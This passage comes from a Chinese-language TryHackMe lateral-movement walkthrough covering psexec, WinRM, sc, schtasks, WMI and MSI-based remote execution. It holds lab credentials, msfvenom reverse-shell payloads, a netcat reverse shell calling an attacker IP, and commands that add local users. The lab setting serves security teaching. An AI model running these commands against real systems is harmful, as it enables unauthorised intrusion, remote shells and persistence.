<li>本地帐户属于本地管理员组</li>
<li>域帐户属于本地管理员组</li>
</ul>
<p>我们感兴趣的差异是用户帐户控制 (UAC) 对本地管理员（默认管理员帐户除外）施加的限制。默认情况下，除非通过 RDP 使用交互式会话，否则本地管理员将无法远程连接到计算机并执行管理任务。 Windows 将拒绝通过 RPC、SMB 或 WinRM 请求的任何管理任务，因为此类管理员将使用经过过滤的介质完整性令牌登录，从而防止帐户执行特权操作。唯一获得完全权限的本地帐户是默认管理员帐户。</p>
<p>具有本地管理权限的域帐户不会受到相同的处理，并且将以完全管理权限登录。</p>
<p>如果需要，可以禁用此安全功能，有时您会发现管理员组中的本地帐户和域帐户之间没有区别。不过，重要的是要记住，如果某些横向移动技术失败，可能是由于使用了强制执行 UAC 的非默认本地管理员。您可以在此处阅读有关此安全功能的更多详细信息：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction">here</a></p>
<h1 id="0x03-远程生成过程">0x03 远程生成过程</h1>
<p>此任务将研究攻击者远程生成进程的可用方法，允许他们在拥有有效凭据的计算机上运行命令。所讨论的每种技术都使用略有不同的方法来实现相同的目的，其中一些可能更适合某些特定场景。</p>
<h2 id="psexec-执行程序">Psexec 执行程序</h2>
<ul>
<li><strong>Ports:</strong> 445/TCP (SMB)</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>多年来，Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。 Psexec 是众多 Sysinternals 工具之一，可以在此处下载：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">here</a></p>
<p>psexec 的工作方式如下：</p>
<ol>
<li>连接到 Admin$ 共享并上传服务二进制文件。 Psexec 使用 psexesvc.exe 作为名称。</li>
<li>连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与 <code>C:\Windows\psexesvc.exe</code> 关联。</li>
<li>创建一些命名管道来处理 stdin/stdout/stderr。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216115647139.png" alt="image-20240216115647139"></p>
<p>要运行 psexec，我们只需提供远程主机所需的管理员凭据以及我们要运行的命令（为方便起见， <code>psexec64.exe</code> 可在 THMJMP2 中的 <code>C:\tools</code> 下找到）：</p>
<pre><code class="hljs scss">psexec64<span class="hljs-selector-class">.exe</span> \\MACHINE_IP -u Administrator -<span class="hljs-selector-tag">p</span> Mypass123 -<span class="hljs-selector-tag">i</span> cmd<span class="hljs-selector-class">.exe</span></code></pre>
<h2 id="使用-winrm-远程创建进程">使用 WinRM 远程创建进程</h2>
<ul>
<li><strong>Ports:</strong> 5985/TCP (WinRM HTTP)</li>
<li>所需的组成员身份：远程管理用户</li>
</ul>
<p>Windows 远程管理 (WinRM) 是一种基于 Web 的协议，用于远程向 Windows 主机发送 Powershell 命令。大多数 Windows Server 安装都会默认启用 WinRM，这使其成为一个有吸引力的攻击媒介。</p>
<p>要从命令行连接到远程 Powershell 会话，我们可以使用以下命令：</p>
<pre><code class="hljs scss">winrs<span class="hljs-selector-class">.exe</span> -u:Administrator -p:Mypass123 -r:target cmd</code></pre>
<p>我们可以从 Powershell 实现相同的目的，但要传递不同的凭据，我们需要创建一个 PSCredential 对象：</p>
<pre><code class="hljs powershell"><span class="hljs-variable">$username</span> = <span class="hljs-string">'Administrator'</span>;
<span class="hljs-variable">$password</span> = <span class="hljs-string">'Mypass123'</span>;
<span class="hljs-variable">$securePassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$password</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>; 
<span class="hljs-variable">$credential</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span>;</code></pre>
<p>获得 PSCredential 对象后，我们可以使用 Enter-PSSession cmdlet 创建交互式会话：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">-Computername</span> TARGET <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$credential</span></code></pre>
<p>Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭证也必须通过 PSCredential 对象传递：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Computername</span> TARGET <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$credential</span> <span class="hljs-literal">-ScriptBlock</span> {whoami}</code></pre>
<h2 id="使用-sc-远程创建服务">使用 sc 远程创建服务</h2>
<ul>
<li>Ports: 端口：
<ul>
<li>135/TCP、49152-65535/TCP（DCE/RPC）</li>
<li>445/TCP（基于 SMB 命名管道的 RPC）</li>
<li>139/TCP（基于 SMB 命名管道的 RPC）</li>
</ul>
</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>Windows 服务也可用于运行任意命令，因为它们在启动时执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们配置 Windows 服务来运行任何应用程序，它仍然会执行该应用程序并随后失败。</p>
<p>我们可以使用 sc.exe（Windows 中提供的标准工具）在远程主机上创建服务。使用sc时，它会通过几种方式尝试通过RPC连接到Service Control Manager（SVCCTL）远程服务程序：</p>
<ol>
<li>将使用 DCE/RPC 进行连接尝试。客户端将首先在端口 135 连接到端点映射器 (EPM)，该端点映射器充当可用 RPC 端点的目录并请求有关 SVCCTL 服务程序的信息。然后，EPM 将响应 IP 和端口以连接到 SVCCTL，该端口通常是 49152-65535 范围内的动态端口。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120249867.png" alt="image-20240216120249867"></p>
<ol start="2">
<li>如果后一个连接失败，sc 将尝试通过端口 445 (SMB) 或 139（基于 NetBIOS 的 SMB）上的 SMB 命名管道到达 SVCCTL。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216120302427.png" alt="image-20240216120302427"></p>
<p>我们可以使用以下命令创建并启动名为“THMservice”的服务：</p>
<pre><code class="hljs scss">sc<span class="hljs-selector-class">.exe</span> \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc<span class="hljs-selector-class">.exe</span> \\TARGET start THMservice</code></pre>
<p>服务启动时将执行“net user”命令，在系统上创建一个新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。</p>
<p>要停止并删除该服务，我们可以执行以下命令：</p>
<pre><code class="hljs scss">sc<span class="hljs-selector-class">.exe</span> \\TARGET stop THMservice
sc<span class="hljs-selector-class">.exe</span> \\TARGET delete THMservice</code></pre>
<h2 id="远程创建计划任务">远程创建计划任务</h2>
<p>我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建并运行一个任务，该任务可在任何 Windows 安装中使用。要创建名为 THMtask1 的任务，我们可以使用以下命令：</p>
<pre><code class="hljs scss">schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /<span class="hljs-selector-tag">tr</span> "&lt;command/payload to execute&gt;" /sc ONCE /sd <span class="hljs-number">01</span>/<span class="hljs-number">01</span>/<span class="hljs-number">1970</span> /st <span class="hljs-number">00</span>:<span class="hljs-number">00</span> 

schtasks /s TARGET /run /TN <span class="hljs-string">"THMtask1"</span></code></pre>
<p>我们将计划类型 (/sc) 设置为 ONCE，这意味着该任务仅在指定的时间和日期运行一次。由于我们将手动运行任务，因此开始日期 (/sd) 和开始时间 (/st) 无论如何都不重要。</p>
<p>由于系统将运行计划任务，因此我们将无法获得该命令的输出，这使得这是一种盲目攻击。</p>
<p>最后，要删除计划任务，我们可以使用以下命令并自行清理：</p>
<pre><code class="hljs scss">schtasks /S TARGET /TN "THMtask1" /DELETE /F</code></pre>
<h2 id="实践练习">实践练习</h2>
<p>对于本练习，我们假设我们已经捕获了一些具有管理访问权限的凭据：</p>
<p><strong>User:</strong> <a target="_blank" rel="noopener" href="http://ZA.TRYHACKME.COM">ZA.TRYHACKME.COM</a>\t1_leonard.summers</p>
<p><strong>Password:</strong> EZpass4ever</p>
<p>我们将展示如何使用这些凭据通过 <code>sc.exe</code> 横向移动到 THMIIS。请随意尝试其他方法，因为它们都应该适用于 THMIIS。</p>
<p>虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用 <code>net user</code> ），但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。原因是服务可执行文件与标准 .exe 文件不同，因此非服务可执行文件几乎会立即被服务管理器杀死。对我们来说幸运的是，msfvenom 支持 <code>exe-service</code> 格式，它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中，防止其被杀死。</p>
<p>要创建反向shell，我们可以使用以下命令：</p>
<p>注意：由于您将与其他人共享实验室，因此您需要为有效负载使用不同的文件名，而不是“myservice.exe”，以避免覆盖其他人的有效负载。</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/shell/reverse_tcp -f exe-service LHOST=<span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span> LPORT=<span class="hljs-number">5555</span> -o bcxservice<span class="hljs-selector-class">.exe</span></code></pre>
<p>然后，我们将继续使用 t1_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将有效负载上传到 THMIIS 的 ADMIN$ 共享：</p>
<pre><code class="hljs SCSS">smbclient -c 'put bcxservice<span class="hljs-selector-class">.exe</span>' -U t1_leonard<span class="hljs-selector-class">.summers</span> -W ZA '<span class="hljs-comment">//thmiis.za.tryhackme.com/admin$/' EZpass4ever</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121358957.png" alt="image-20240216121358957"></p>
<p>上传可执行文件后，我们将在攻击者的计算机上设置一个侦听器以接收来自 <code>msfconsole</code> 的反向 shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ msfconsole
msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set LHOST <span class="hljs-number">10.50</span>.<span class="hljs-number">46.236</span>
msf6 exploit(multi/handler) &gt; set LPORT <span class="hljs-number">5555</span>
msf6 exploit(multi/handler) &gt; set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) &gt; exploit 

[*] Started reverse TCP handler on <span class="hljs-number">10.50</span>.<span class="hljs-number">46.236</span>:<span class="hljs-number">5555</span></code></pre>
<p>或者，您可以在 Linux 控制台上运行以下单行代码来执行相同的操作：</p>
<pre><code class="hljs scss">msfconsole -<span class="hljs-selector-tag">q</span> -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span>; set LPORT <span class="hljs-number">5555</span>;exploit"</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216121628886.png" alt="image-20240216121628886"></p>
<p>由于 <code>sc.exe</code> 不允许我们在命令中指定凭据，因此我们需要使用 <code>runas</code> 使用 t1_leonard.summer 的访问令牌生成一个新 shell。尽管如此，我们只能通过 SSH 访问计算机，因此如果我们尝试类似 <code>runas /netonly /user:ZA\t1_leonard.summers cmd.exe</code> 的内容，新的命令提示符将在用户会话中生成，但我们无法访问它。为了解决这个问题，我们可以使用 runas 生成带有 t1_leonard.summers 访问令牌的第二个反向 shell：</p>
<pre><code class="hljs scss">runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers <span class="hljs-string">"c:\tools\nc64.exe -e cmd.exe 10.50.46.236 6666"</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216122007744.png" alt="image-20240216122007744"></p>
<p>注意：请记住，由于您将 <code>runas</code> 与 <code>/netonly</code> 选项一起使用，因此不会费心检查所提供的凭据是否有效（有关此的更多信息，请参阅枚举 AD 室），因此请务必正确输入密码。如果不这样做，您稍后会在房间中看到一些 ACCESS DENIED 错误。</p>
<p>我们可以像往常一样在 AttackBox 中使用 nc 接收反向 shell 连接：</p>
<pre><code class="hljs scss">nc -lvnp <span class="hljs-number">6666</span></code></pre>
<p>最后，继续使用 sc 远程创建一个新服务，并将其与我们上传的二进制文件关联起来：</p>
<pre><code class="hljs scss">C:\&gt; sc.exe \\thmiis.za.tryhackme.com create THMservice-bcx binPath= <span class="hljs-string">"%windir%\bcxservice.exe"</span> start= auto
C:\&gt; sc.exe \\thmiis.za.tryhackme.com start THMservice-bcx</code></pre>
<p>请务必更改您的服务名称，以避免与其他学生发生冲突。</p>
<p>启动该服务后，您应该会在 AttackBox 中收到一个连接，您可以从该连接访问 t1_leonard.summers 桌面上的第一个标志。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123451462.png" alt="image-20240216123451462"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216123458246.png" alt="image-20240216123458246"></p>
<h1 id="0x04-使用-wmi-横向移动">0x04 使用 WMI 横向移动</h1>
<p>我们还可以使用 Windows Management Instrumentation (WMI) 以不同的方式执行上一个任务中讨论的许多技术。 WMI 是基于 Web 的企业管理 (WBEM) 的 Windows 实现，WBEM 是跨设备访问管理信息的企业标准。</p>
<p>简单来说，WMI 允许管理员执行标准管理任务，攻击者可以滥用这些任务以各种方式执行横向移动，我们将对此进行讨论。</p>
<h2 id="从-powershell-连接到-wmi">从 Powershell 连接到 WMI</h2>
<p>在能够使用 Powershell 命令连接到 WMI 之前，我们需要使用我们的用户和密码创建一个 PSCredential 对象。该对象将存储在 $credential 变量中，并在该任务的整个技术中使用：</p>
<pre><code class="hljs powershell"><span class="hljs-variable">$username</span> = <span class="hljs-string">'Administrator'</span>;
<span class="hljs-variable">$password</span> = <span class="hljs-string">'Mypass123'</span>;
<span class="hljs-variable">$securePassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$password</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>;
<span class="hljs-variable">$credential</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span>;</code></pre>
<p>然后，我们继续使用以下协议之一建立 WMI 会话：</p>
<ul>
<li>DCOM：RPC over IP 将用于连接到 WMI。该协议使用端口 135/TCP 和端口 49152-65535/TCP，正如使用 sc.exe 时所解释的那样。</li>
<li>Wsman：WinRM 将用于连接到 WMI。此协议使用端口 5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)。</li>
</ul>
<p>要从 Powershell 建立 WMI 会话，我们可以使用以下命令并将会话存储在 $Session 变量中，我们将在整个房间中使用不同的技术：</p>
<pre><code class="hljs powershell"><span class="hljs-variable">$Opt</span> = <span class="hljs-built_in">New-CimSessionOption</span> <span class="hljs-literal">-Protocol</span> DCOM
<span class="hljs-variable">$Session</span> = <span class="hljs-built_in">New-Cimsession</span> <span class="hljs-literal">-ComputerName</span> TARGET <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$credential</span> <span class="hljs-literal">-SessionOption</span> <span class="hljs-variable">$Opt</span> <span class="hljs-literal">-ErrorAction</span> Stop</code></pre>
<p><code>New-CimSessionOption</code> cmdlet 用于配置 WMI 会话的连接选项，包括连接协议。然后，选项和凭据将传递到 <code>New-CimSession</code> cmdlet 以建立针对远程主机的会话。</p>
<h2 id="使用-wmi-远程创建进程">使用 WMI 远程创建进程</h2>
<ul>
<li>Ports:
<ul>
<li>135/TCP, 49152-65535/TCP (DCERPC)</li>
<li>5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)</li>
</ul>
</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>我们可以利用 Windows Management Instrumentation (WMI) 从 Powershell 远程生成一个进程，向 Win32_Process 类发送 WMI 请求，以在我们之前创建的会话下生成该进程：</p>
<pre><code class="hljs powershell"><span class="hljs-variable">$Command</span> = <span class="hljs-string">"powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere"</span>;

<span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Process <span class="hljs-literal">-MethodName</span> Create <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>{
CommandLine = <span class="hljs-variable">$Command</span>
}</code></pre>
<p>请注意，WMI 不允许您查看任何命令的输出，但确实会静默创建所需的进程。</p>
<p>在旧系统上，可以在命令提示符下使用 wmic 完成相同的操作：</p>
<pre><code class="hljs scss">wmic<span class="hljs-selector-class">.exe</span> /user:Administrator /password:Mypass123 /node:TARGET process call create <span class="hljs-string">"cmd.exe /c calc.exe"</span></code></pre>
<h2 id="使用-wmi-远程创建服务">使用 WMI 远程创建服务</h2>
<ul>
<li>Ports:
<ul>
<li>135/TCP, 49152-65535/TCP (DCERPC)</li>
<li>5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)</li>
</ul>
</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>我们可以通过Powershell使用WMI创建服务。要创建名为 THMService2 的服务，我们可以使用以下命令：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Service <span class="hljs-literal">-MethodName</span> Create <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>{
Name = <span class="hljs-string">"THMService2"</span>;
DisplayName = <span class="hljs-string">"THMService2"</span>;
PathName = <span class="hljs-string">"net user munra2 Pass123 /add"</span>; <span class="hljs-comment"># Your payload</span>
ServiceType = [<span class="hljs-built_in">byte</span>]::Parse(<span class="hljs-string">"16"</span>); <span class="hljs-comment"># Win32OwnProcess : Start service in a new process</span>
StartMode = <span class="hljs-string">"Manual"</span>
}</code></pre>
<p>然后，我们可以获取该服务的句柄并使用以下命令启动它：</p>
<pre><code class="hljs powershell"><span class="hljs-variable">$Service</span> = <span class="hljs-built_in">Get-CimInstance</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Service <span class="hljs-literal">-filter</span> <span class="hljs-string">"Name LIKE 'THMService2'"</span>

<span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$Service</span> <span class="hljs-literal">-MethodName</span> StartService</code></pre>
<p>最后，我们可以使用以下命令停止并删除该服务：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$Service</span> <span class="hljs-literal">-MethodName</span> StopService
<span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$Service</span> <span class="hljs-literal">-MethodName</span> Delete</code></pre>
<h2 id="使用-wmi-远程创建计划任务">使用 WMI 远程创建计划任务</h2>
<ul>
<li>Ports:
<ul>
<li>135/TCP, 49152-65535/TCP (DCERPC)</li>
<li>5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)</li>
</ul>
</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>我们可以使用 Windows 默认安装中提供的一些 cmdlet 创建并执行计划任务：</p>
<pre><code class="hljs powershell"><span class="hljs-comment"># Payload must be split in Command and Args</span>
<span class="hljs-variable">$Command</span> = <span class="hljs-string">"cmd.exe"</span>
<span class="hljs-variable">$Args</span> = <span class="hljs-string">"/c net user munra22 aSdf1234 /add"</span>

<span class="hljs-variable">$Action</span> = <span class="hljs-built_in">New-ScheduledTaskAction</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-Execute</span> <span class="hljs-variable">$Command</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$Args</span>
<span class="hljs-built_in">Register-ScheduledTask</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-Action</span> <span class="hljs-variable">$Action</span> <span class="hljs-literal">-User</span> <span class="hljs-string">"NT AUTHORITY\SYSTEM"</span> <span class="hljs-literal">-TaskName</span> <span class="hljs-string">"THMtask2"</span>
<span class="hljs-built_in">Start-ScheduledTask</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-TaskName</span> <span class="hljs-string">"THMtask2"</span></code></pre>
<p>要在使用完计划任务后将其删除，我们可以使用以下命令：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Unregister-ScheduledTask</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-TaskName</span> <span class="hljs-string">"THMtask2"</span></code></pre>
<h2 id="wmi-通过-wmi-安装-msi-包">WMI 通过 WMI 安装 MSI 包</h2>
<ul>
<li>Ports:
<ul>
<li>135/TCP, 49152-65535/TCP (DCERPC)</li>
<li>5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)</li>
</ul>
</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>MSI 是一种用于安装程序的文件格式。如果我们可以将 MSI 包复制到目标系统，那么我们就可以使用 WMI 尝试为我们安装它。攻击者可以通过任何可用的方式复制该文件。一旦 MSI 文件位于目标系统中，我们就可以尝试通过 WMI 调用 Win32_Product 类来安装它：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Product <span class="hljs-literal">-MethodName</span> Install <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>{PackageLocation = <span class="hljs-string">"C:\Windows\myinstaller.msi"</span>; Options = <span class="hljs-string">""</span>; AllUsers = <span class="hljs-variable">$false</span>}</code></pre>
<p>我们可以通过在遗留系统中使用 wmic 来实现相同的目的：</p>
<pre><code class="hljs scss">wmic /node<span class="hljs-selector-pseudo">:TARGET</span> /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi</code></pre>
<h2 id="实践练习">实践练习</h2>
<p>对于本练习，我们假设我们已经捕获了一些具有管理访问权限的凭据：</p>
<p>用户：<a target="_blank" rel="noopener" href="http://ZA.TRYHACKME.COM">ZA.TRYHACKME.COM</a>\t1_corine.waters</p>
<p><strong>Password:</strong> Korine.1994</p>
<p>我们将展示如何使用这些凭据通过 WMI 和 MSI 包横向移动到 THM-IIS。请随意尝试此任务中介绍的其他方法。</p>
<p>我们将首先从攻击者机器上使用 msfvenom 创建 MSI 有效负载：</p>
<p>注意：由于您将与其他人共享实验室，因此您需要为有效负载使用不同的文件名，而不是“myinstaller.msi”，以避免覆盖其他人的有效负载。</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/shell_reverse_tcp LHOST=<span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span> LPORT=<span class="hljs-number">5555</span> -f msi &gt; bcxinstaller<span class="hljs-selector-class">.msi</span></code></pre>
<p>然后，我们使用 SMB 或任何其他可用的方法复制有效负载：</p>
<pre><code class="hljs scss">smbclient -c 'put bcxinstaller<span class="hljs-selector-class">.msi</span>' -U t1_corine<span class="hljs-selector-class">.waters</span> -W ZA '<span class="hljs-comment">//thmiis.za.tryhackme.com/admin$/' Korine.1994</span></code></pre>
<p>由于我们将有效负载复制到 ADMIN$ 共享，因此它将在服务器上的 C:\Windows\ 中可用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216140108272.png" alt="image-20240216140108272"></p>
<p>我们启动一个处理程序来接收来自 Metasploit 的反向 shell：</p>
<pre><code class="hljs scss">msf6 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set LHOST <span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span>
msf6 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set LPORT <span class="hljs-number">5555</span>
msf6 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set payload windows/x64/shell_reverse_tcp
msf6 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; exploit</code></pre>
<p>让我们从 Powershell 控制台启动针对 THMIIS 的 WMI 会话：</p>
<pre><code class="hljs scss">PS C:\&gt; <span class="hljs-variable">$username</span> = <span class="hljs-string">'t1_corine.waters'</span>;
PS C:\&gt; <span class="hljs-variable">$password</span> = <span class="hljs-string">'Korine.1994'</span>;
PS C:\&gt; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force;
PS C:\&gt; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span>;
PS C:\&gt; <span class="hljs-variable">$Opt</span> = New-CimSessionOption -Protocol DCOM
PS C:\&gt; <span class="hljs-variable">$Session</span> = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential <span class="hljs-variable">$credential</span> -SessionOption <span class="hljs-variable">$Opt</span> -ErrorAction Stop</code></pre>
<p>然后，我们从 Win32_Product 类调用 Install 方法来触发有效负载：</p>
<pre><code class="hljs scss">PS C:\&gt; Invoke-CimMethod -CimSession <span class="hljs-variable">$Session</span> -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\bcxinstaller.msi<span class="hljs-string">"; Options = "</span><span class="hljs-string">"; AllUsers = $false}</span></code></pre>
<p>因此，您应该在 AttackBox 中收到一个连接，您可以通过该连接访问 t1_corine.waters 桌面上的标志。</p>
<h1 id="0x05-使用替代认证材料">0x05 使用替代认证材料</h1>
<p>通过替代身份验证材料，我们指的是可用于访问 Windows 帐户而无需实际知道用户密码本身的任何数据。这是可能的，因为 Windows 网络使用的某些身份验证协议的工作方式。在此任务中，我们将研究当网络上存在以下任一身份验证协议时可作为用户登录的几种替代方案：</p>
<ul>
<li>NTLM认证</li>
<li>Kerberos 身份验证</li>
</ul>
<p>注意：在此任务中，假定您熟悉从主机提取凭据的方法和工具。 Mimikatz 将被用作整个房间中凭证提取的首选工具。</p>
<h2 id="ntlm认证">NTLM认证</h2>
<p>在深入研究实际的横向移动技术之前，我们先看一下 NTLM 身份验证的工作原理：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216145026235.png" alt="image-20240216145026235"></p>
<ol>
<li>客户端向他们想要访问的服务器发送身份验证请求。</li>
<li>服务器生成一个随机数并将其作为质询发送给客户端。</li>
<li>客户端将其 NTLM 密码哈希与质询（以及其他已知数据）结合起来，生成对质询的响应，并将其发送回服务器进行验证。</li>
<li>服务器将质询和响应转发给域控制器进行验证。</li>
<li>域控制器使用质询重新计算响应并将其与客户端发送的初始响应进行比较。如果两者匹配，则客户端通过身份验证；否则，访问将被拒绝。认证结果发送回服务器。</li>
<li>服务器将认证结果转发给客户端。</li>
</ol>
<p>注意：所描述的过程适用于使用域帐户时。如果使用本地帐户，服务器可以验证对质询本身的响应，而无需与域控制器交互，因为它的 SAM 上本地存储有密码哈希值。</p>
<h2 id="传递哈希值">传递哈希值</h2>
<p>从我们获得管理权限的主机中提取凭据（通过使用 mimikatz 或类似工具）后，我们可能会获得可以轻松破解的明文密码或哈希值。然而，如果我们不够幸运，我们最终会得到未破解的 NTLM 密码哈希值。</p>
